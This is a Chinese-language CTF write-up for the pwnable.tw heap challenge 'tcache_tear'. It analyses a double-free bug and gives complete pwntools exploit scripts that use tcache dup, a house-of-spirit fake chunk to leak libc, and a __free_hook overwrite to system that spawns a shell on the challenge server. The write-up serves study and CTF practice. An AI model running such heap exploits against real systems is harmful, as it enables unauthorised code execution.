## 检查

```
$ file tcache_tear 
tcache_tear: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=a273b72984b37439fd6e9a64e86d1c2131948f32, stripped
$ checksec tcache_tear 
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    FORTIFY:  Enabled
```

64位动态链接，去符号表，got表不可写，更优雅的查看libc版本

```
$ strings libc-tcache.so | grep GNU
GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1) stable release version 2.27.
Compiled by GNU CC version 7.3.0.
```

为libc 2.27，去glibc-all-in-one下载文件

```
$ cd glibc-all-in-one/
$ cat list
$ ./download 2.27-3ubuntu1_amd64
```

比较这两个文件

```
$ diff glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so libc-tcache.so
```

完全一样，所以我们只需要让题目文件指向我们的libc即可

```
$ patchelf  --set-rpath ~/Desktop/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/ tcache_tear 
$ patchelf --set-interpreter ~/Desktop/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/ld-2.27.so tcache_tear
```

## 分析

运行发现是首先是输入一个名字，然后还是菜单，malloc，free和info，不过free并没有指定目标序号，还是IDA直接进行分析。需要注意的是，IDA分析出了main函数，并不意味着main这个函数符号没被去掉，可以发现gdb并无法对main函数打断，所以IDA分析出的main函数是从libc_start_main的参数推算出来的。分析后对以下函数重命名：

```
sub_400948 -> init_
sub_400A25 -> read_string
sub_400A9C -> menu
sub_4009C4 -> read_num
sub_400B99 -> info
sub_400B14 -> add
unk_602060 -> name
```

### main

```c
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  __int64 v3; // rax
  unsigned int v4; // [rsp+Ch] [rbp-4h]

  init_();
  printf("Name:", a2);
  read_string((__int64)&name, 0x20u);
  v4 = 0;
  while ( 1 )
  {
    while ( 1 )
    {
      menu();
      v3 = read_num();
      if ( v3 != 2 )
        break;
      if ( v4 <= 7 )
      {
        free(ptr);
        ++v4;
      }
    }
    if ( v3 > 2 )
    {
      if ( v3 == 3 )
      {
        info();
      }
      else
      {
        if ( v3 == 4 )
          exit(0);
LABEL_14:
        puts("Invalid choice");
      }
    }
    else
    {
      if ( v3 != 1 )
        goto LABEL_14;
      add();
    }
  }
}
```

程序会先读取用户输入最长为0x20的字符串放到bss段，然后进入主循环，值得注意的是：

- info是打印name的那个bss字段，固定输出0x20个字节
- free函数的参数是一个固定在bss段的全局变量，而且free后没清零
- 最多可以free 8次

### add

```c
int add()
{
  unsigned __int64 v0; // rax
  int size; // [rsp+8h] [rbp-8h]

  printf("Size:");
  v0 = read_num();
  size = v0;
  if ( v0 <= 0xFF )
  {
    ptr = malloc(v0);
    printf("Data:");
    read_string((__int64)ptr, size - 16);
    LODWORD(v0) = puts("Done !");
  }
  return v0;
}
```

这个函数可以任意申请大小小于0xff的堆块并填写size-0x10大小的内容，然后返回堆块地址到ptr这个bss段的全局变量上，ptr只能保存最后一个申请的堆块的地址。

## 漏洞点

- 在free后，没有对指针进行清零，导致存在悬空指针。一个堆块可以free多次，存在UAF。
- 在add函数中，malloc后使用read_string函数进行输入的参数为`size - 16`，如果size为小于16的正数，得到的结果被转换为无符号整数参数就可以读入大于堆块size的数据，导致堆溢出

不过后文中第二个漏洞并没有用到

## 前置知识

可以参考ctf-wiki上的内容

- [tcache](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/implementation/tcache-zh/)
- [Tcache Attack](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack-zh/)

简单的来说，tcache就是为了追求效率，实现的一个更简单，更没啥校验，更大的fastbin

## 利用

### tcache dup构造任意地址写

- [tcache-dup](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack-zh/#tcache-dup)

简单来说就是double free，而且并没有检验，所以我们可以直接这样利用

```c
a = malloc(0x20);

free(a);
free(a);

malloc(0x20,addr)
malloc(0x20)
malloc(0x20,data)
```

我们来测试一下，利用tcache修改我们的名字：

```python
#!/usr/bin/env python3

from pwn import *
import sys, time

context(arch='amd64',os='linux',log_level='debug')

debug = 1
if debug:
	elf = ELF("./tcache_tear")
	libc = ELF("./libc-tcache.so")
	io = process(elf.path)
else:
	elf = ELF("./tcache_tear")
	libc = ELF("./libc-tcache.so")
	io = remote("chall.pwnable.tw",10207)

################################################
s = io.send                                    #
sl = io.sendline                               #
sa = io.sendafter                              #
sla = io.sendlineafter                         #
r = io.recv                                    #
rl = io.recvline                               #
ru = io.recvuntil                              #
it = io.interactive                            #
################################################

init = lambda name : sla("Name:",name)
malloc = lambda size,data : (sla("choice :","1"),sla("Size:", str(size)),sla("Data:",data))
free = lambda : sla("choice :","2")
info = lambda : sla("choice :","3")

len = 0x50
name_bss = 0x602060

init("0bs3rver")
malloc(len,"aaa")
free()
free()
malloc(len,p64(name_bss))
malloc(len,"aaa")
malloc(len,"root")
info()
io.interactive()
```

运行脚本可以发现已经打印出了root，证明我们已经获得了任意地址写任意值的能力

接下来我们需要的就是找到能控制程序流的内存数据，然后修改掉，我们一般有如下选择：

- 程序自己实现的函数指针
- GOT表
- fini_array段函数指针
- libc中的函数指针

不过我们发现：

- 程序自己没有什么函数指针
- GOT表不可写
- main函数是个死循环，不会返回到libc_start_main，进而执行到fini_array段注册的函数

故只好泄露libc基址，进而去修改libc中可以被调用的函数指针

### 构造伪堆块泄露libc

#### tcache泄露libc常规办法

我们leak的能力目前只有info，想要泄漏出libc地址可以通过堆管理器的双向链表的机制进行泄露，我们只要把堆块想办法搞到unsorted bin这种双向链表里，在想办法读到堆块的数据即可。绕过tcache使得堆块free后进入unsorted bin的方式通常有两种：

1. 每个tcache链上默认最多包含7个块，再次free这个大小的堆块将会进入其他bin中，例如[tcache_attack/libc-leak](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack-zh/#libc-leak)
2. 默认情况下，tcache中的单链表个数是64个，64位下可容纳的最大内存块大小是1032（0x408），故只要申请一个size大于0x408的堆块，然后free即可

但是本题均无法直接做到：

1. 在free处做了限制，最多free七次，无法填满tcache的一条单链
2. 在add函数中，无法申请大于0xff的堆块

#### house of spirit

house of spirit 技术的核心原理是在目标位置处伪造一个chunk，并将其释放，从而达到分配**指定地址**的chunk的目的，**成功的关键是要能够修改指定地址的前后的内容使其可以绕过对应的检测**。

- [fashbin house-of-spirit](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/fastbin_attack-zh/#house-of-spirit)
- [tcache house-of-spirit](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack-zh/#tcache-house-of-spirit)

放到本题中，利用思路就是：

1. 利用任意地址写，在bss段构造大小超出0x408的伪堆块
2. 然后free掉，使其进入unsorted bin中
3. 利用info函数，读取其内容即可

需要注意的是我们**除了要伪造的size要大于0x408，并且伪堆块后面的数据也要满足基本的堆块格式，而且至少两块。**因为在free时，会对当前的堆块后面的堆块进行一系列检查：

> https://github.com/lattera/glibc/blob/master/malloc/malloc.c

```
// 在 _int_free 函数中
if (nextchunk != av->top) {
  /* get and clear inuse bit */
  nextinuse = inuse_bit_at_offset(nextchunk, nextsize);
```

可以看到free函数对当前的堆块的nextchunk也进行了相应的检查，并且还检查了nextchunk的inuse位，这一位的信息在nextchunk的nextchunk中，所以在这里我们总共要伪造三个堆块。第一个堆块我们构造大小为0x500，第二个和第三个分别构造为0x20大小的堆块，这些堆块的标记位，均为只置prev_inuse为1，使得free不去进行合并操作。如图：

```
                        bss

name  +------------> +--------+ +------------+
                     |   0    |
                     +--------+
                     |  0x501 |
ptr   +------------> +--------+
                     |        |
free(ptr);           |        |
                     |        |  fake chunk 1
                     |        |
                     |        |
                     |        |
                     |        |
                     |        |
                     |        |
name + 0x500  +----> +--------+ +------------+
                     |   0    |
                     +--------+
                     |  0x21  |
                     +--------+  fake chunk 2
                     |   0    |
                     +--------+
                     |   0    |
                     +--------+ +------------+
                     |   0    |
                     +--------+
                     |  0x21  |
                     +--------+  fake chunk 3
                     |   0    |
                     +--------+
                     |   0    |
                     +--------+ +------------+
    
```

> 复习：堆块的第一个0为pre_size，即前一个chunk的大小，第二个为chunk_size，即当前chunk大小，有8字节对齐，后三位分别为：A(是否为main_arena,即主线程)、M(该chunk是否由mmap分配)，P(前一个chunk是否被分配，故经常会看到chunk_size比chunk大1字节)，而用户申请得到的指针直接指向数据处

我们可以使用如下策略：

1. 在最开始输入name时，直接构造好chunk1的前16个字节
2. 然后利用任意地址写构造name+0x500的后两个伪堆块
3. 再次利用任意地址写，向name+0x10写任意数据，目的是执行完最后一个malloc，ptr全局变量会被更新为name+0x10
4. free即可将这个堆块送入unsorted bin中
5. 使用info函数读取name前0x20字节的内容，即可泄露unsorted bin地址
6. 本地调试unsorted bin得出偏移

```python
#!/usr/bin/env python3
from pwn import *
import sys, time

context(arch='amd64',os='linux',log_level='debug')

debug = 1
if debug:
	elf = ELF("./tcache_tear")
	libc = ELF("./libc-tcache.so")
	io = process(elf.path)
else:
	elf = ELF("./tcache_tear")
	libc = ELF("./libc-tcache.so")
	io = remote("chall.pwnable.tw",10207)

################################################
s = io.send                                    #
sl = io.sendline                               #
sa = io.sendafter                              #
sla = io.sendlineafter                         #
r = io.recv                                    #
rl = io.recvline                               #
ru = io.recvuntil                              #
it = io.interactive                            #
################################################

init = lambda name : sla("Name:",name)
malloc = lambda size,data : (sla("choice :","1"),sla("Size:", str(size)),sla("Data:",data))
free = lambda : sla("choice :","2")
info = lambda : sla("choice :","3")

def aaw(len,addr,data):
    malloc(len,"aaa")
    free()
    free()
    malloc(len,p64(addr))
    malloc(len,"aaa")
    malloc(len,data)
    
name_bss = 0x602060

init(p64(0)+p64(0x501))
aaw(0x50,name_bss+0x500,(p64(0)+p64(0x21)+p64(0)*2)*2)
aaw(0x60,name_bss+0x10,'a')
free()

info()
io.recvuntil("Name :"); io.recv(0x10)
libc_addr = u64(io.recv(8))
log.warn("leak:0x%x"%libc_addr)

gdb.attach(io,'b * 0x400c07')
io.interactive()
```

这里采用：`io.recvuntil("Name :"); io.recv(0x10)`，而不直接采用：`io.recv(0x16)`的原因是，`Name :`这6个字符和后面的内容是两条语句打印，在远程攻击的时候可能会出现数据先后到达延迟的io问题。

需要注意的是，我们这里使用的是glibc-all-in-one + patchelf 得到的glibc 2.27的环境，虽然我们gdb tcache_tear时glibc地址每次都一样，但是我们运行时glibc的基址是会变化的，所以我们需要脚本输出后直接进入gdb用vmmap来得到基址并计算偏移

本地调试得到偏移为 0x3ebca0

### 控制流劫持

libc中有很多可以利用的函数指针，在堆的题目中常用的函数是**__free_hook**和**__malloc_hook**

hook 即 钩子

#### libc中的钩子函数

在malloc和free的函数的开始部分，都会去判断是否有相应的钩子函数：

```c
// wapper for int_malloc
void *__libc_malloc(size_t bytes) {
    mstate ar_ptr;
    void * victim;
    // 检查是否有内存分配钩子，如果有，调用钩子并返回.
    void *(*hook)(size_t, const void *) = atomic_forced_read(__malloc_hook);
    if (__builtin_expect(hook != NULL, 0))
        return (*hook)(bytes, RETURN_ADDRESS(0));
...
}
// wapper for int_free
void __libc_free(void *mem) {
    mstate    ar_ptr;
    mchunkptr p; /* chunk corresponding to mem */
    // 判断是否有钩子函数 __free_hook
    void (*hook)(void *, const void *) = atomic_forced_read(__free_hook);
    if (__builtin_expect(hook != NULL, 0)) {
        (*hook)(mem, RETURN_ADDRESS(0));
        return;
    }
...
}
```

程序先把全局变量__free_hook赋给了局部变量hook，然后对hook是否为NULL进行判断，如果不为空，则执行hook。

一般的情况下\__free_hook是为NULL的，所以是不会执行的，但是如果有人恶意修改\_\_free_hook的话，就会造成__free_hook劫持。

这是用来方便用户自定义自己的malloc和free函数，用法参考：[malloc hook初探](https://www.jianshu.com/p/0d7aa3166eec)：

```c
void (*__malloc_initialize_hook) (void) = my_init_hook;
__malloc_hook = my_malloc_hook;
__free_hook = my_free_hook;
```

直接利用这种赋值语句，就可以直接给libc中的对应变量赋值，因为这几个符号都是libc所导出的。

那么同理，其他的hook函数也可能被我们所利用（狗头

```
$ strings libc-tcache.so | grep hook
__malloc_initialize_hook
_dl_open_hook
argp_program_version_hook
__after_morecore_hook
__memalign_hook
__malloc_hook
__free_hook
_dl_open_hook2
__realloc_hook
```

#### 利用__free_hook

本题我们利用__free_hook来完成控制流劫持，因为我们可以执行free函数，即可以触发到相应的函数指针，并且方便控制参数：

```c
if ( v4 <= 7 )
{
  free(ptr);
  ++v4;
}
```

ptr参数可以通过malloc直接控制，所以接下来有两种方法：

1. 直接劫持__free_hook到one_gadget
2. 劫持__free_hook到system函数，并再次malloc控制ptr指向`/bin/sh`等字符串

找到以下one_gadget地址，测试第二个可用：

```
$ one_gadget libc-tcache.so 
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

## exp

原来system($0)也能获取shell，又学到一手

```python
#!/usr/bin/env python3
from pwn import *
import sys, time

context(arch='amd64',os='linux',log_level='debug')

debug = 0
if debug:
	elf = ELF("./tcache_tear")
	libc = ELF("./libc-tcache.so")
	io = process(elf.path)
else:
	elf = ELF("./tcache_tear")
	libc = ELF("./libc-tcache.so")
	io = remote("chall.pwnable.tw",10207)

################################################
s = io.send                                    #
sl = io.sendline                               #
sa = io.sendafter                              #
sla = io.sendlineafter                         #
r = io.recv                                    #
rl = io.recvline                               #
ru = io.recvuntil                              #
it = io.interactive                            #
################################################

init = lambda name : sla("Name:",name)
malloc = lambda size,data : (sla("choice :","1"),sla("Size:", str(size)),sla("Data:",data))
free = lambda : sla("choice :","2")
info = lambda : sla("choice :","3")

def aaw(len,addr,data):
    malloc(len,"aaa")
    free()
    free()
    malloc(len,p64(addr))
    malloc(len,"aaa")
    malloc(len,data)
    
name_bss = 0x602060

init(p64(0)+p64(0x501))
aaw(0x50,name_bss+0x500,(p64(0)+p64(0x21)+p64(0)*2)*2)
aaw(0x60,name_bss+0x10,'a')
free()

info()
io.recvuntil("Name :"); io.recv(0x10)
libc_addr = u64(io.recv(8)) - 0x3ebca0
free_hook = libc_addr + libc.symbols['__free_hook']
system    = libc_addr + libc.symbols['system']

aaw(0x70,free_hook,p64(system))
malloc(0x80,"$0\x00")
free()

io.interactive()
```



参考：

- [和媳妇一起学Pwn 之 Tcache Tear](https://xuanxuanblingbling.github.io/ctf/pwn/2020/03/13/tcache/)
- [__free_hook 劫持原理](http://blog.eonew.cn/archives/521)

